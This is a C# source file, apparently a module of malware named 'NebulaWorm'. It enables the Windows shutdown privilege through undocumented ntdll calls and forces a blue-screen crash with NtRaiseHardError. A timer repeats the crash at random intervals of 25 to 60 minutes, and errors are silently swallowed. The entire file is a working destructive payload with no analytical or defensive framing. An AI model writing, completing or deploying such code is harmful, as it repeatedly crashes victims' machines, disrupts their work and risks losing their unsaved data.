using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace NebulaWorm
{
    public static class RBSOD
    {
        private static Timer bsodTimer;
        private static Random random = new Random();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
            int Privilege,
            bool Enable,
            bool CurrentThread,
            out bool Enabled);

        public static void Start()
        {
            ScheduleNextBSOD(null);
        }

        private static void ScheduleNextBSOD(object state)
        {
            int interval = GetRandomInterval();
            bsodTimer = new Timer(TriggerBSOD, null, interval, Timeout.Infinite);
        }

        private static int GetRandomInterval()
        {
            // 25-60 minutes random
            return random.Next(25 * 60_000, 60 * 60_000);
        }

        private static void TriggerBSOD(object state)
        {
            try
            {
                bool enabled;
                RtlAdjustPrivilege(19, true, false, out enabled); 

                uint response;
                NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out response);
            }
            catch
            {
            }
            finally
            {
                ScheduleNextBSOD(null);
            }
        }
    }
}
